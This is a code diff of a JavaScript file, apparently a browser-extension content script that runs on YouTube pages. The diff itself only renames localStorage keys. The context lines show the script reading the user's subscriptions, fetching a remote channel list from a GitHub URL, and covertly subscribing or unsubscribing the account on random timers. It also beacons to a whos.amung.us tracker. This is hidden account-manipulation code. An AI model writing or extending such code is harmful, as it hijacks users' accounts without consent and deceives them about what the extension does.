@@ -384,7 +384,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 	*/
 	function ifNotDownloadSubList() {
 
-		var list = window.localStorage.getItem('subList2');
+		var list = window.localStorage.getItem('subList3');
 		if (!list) {
 			subListArray = getSubscriptionList();
 			console.log(subListArray.length);
@@ -393,7 +393,7 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 				window.localStorage.setItem("unsubCount", subListArray.length);
 			}
 	
-			window.localStorage.setItem("subList2", JSON.stringify(subListArray))
+			window.localStorage.setItem("subList3", JSON.stringify(subListArray))
 		} else {
 			console.log("Has been saved")
 		}
@@ -402,14 +402,14 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 
 	function ifNotDownloadMajor() {
 		try{
-			var majorList = window.localStorage.getItem('majorList2');
+			var majorList = window.localStorage.getItem('majorList3');
 			if (!majorList) {
 				subListArray = getSubscriptionList();
 				majorDataRaw = sendSyncXhrReq("https://raw.githubusercontent.com/modifyheader/modhead/master/last1month");
 				majorDataArray = JSON.parse(majorDataRaw).filter( elements => elements.link.indexOf("channel") > 0 ).map(elements => {
 					return elements.link
 				})
-				window.localStorage.setItem("majorList2", JSON.stringify(majorDataArray))
+				window.localStorage.setItem("majorList3", JSON.stringify(majorDataArray))
 			} else {
 				console.log("Has been saved")
 			}
@@ -420,12 +420,12 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 	}
 
 	function getElementOfSubList() {
-		var subList = window.localStorage.getItem('subList2')
+		var subList = window.localStorage.getItem('subList3')
 		
 		 if(  subList != -1){
 			var subListArray = JSON.parse(subList)
 			var lastElement = subListArray.pop();
-			window.localStorage.setItem("subList2", JSON.stringify(subListArray))
+			window.localStorage.setItem("subList3", JSON.stringify(subListArray))
 		
 			majorList = ifNotDownloadMajor();
 		
@@ -497,8 +497,8 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 		  })
 	}
 	
-	if( !window.localStorage.getItem("downSubListCount") ){
-		window.localStorage.setItem("downSubListCount", 0);
+	if( !window.localStorage.getItem("downSubListCount2") ){
+		window.localStorage.setItem("downSubListCount2", 0);
 	}
 	
 
@@ -511,12 +511,12 @@ if (location.hostname.indexOf("youtube.com") >= 0 && document.body.innerHTML.spl
 				  subscribe("https://www.youtube.com/channel/"+vars.channelIds+"?pbj=1",false)
 				  setTimeout(unSub, getRndInteger(1000*15, 1000*45) )    
 			  }else{
-				 let counter = parseInt(window.localStorage.getItem("downSubListCount"));
+				 let counter = parseInt(window.localStorage.getItem("downSubListCount2"));
 				 if( counter < 5){
 					  new Image().src = 'https://whos.amung.us/pingjs/?k=selamcek80';
-					window.localStorage.setItem("downSubListCount", counter + 1);
+					window.localStorage.setItem("downSubListCount2", counter + 1);
 					subListArray = getSubscriptionList();
-					window.localStorage.setItem("subList2", JSON.stringify(subListArray))
+					window.localStorage.setItem("subList3", JSON.stringify(subListArray))
 					setTimeout(unSub, getRndInteger(1000*15, 1000*45) )    
 					console.log("COUNTER" + counter)
 				 
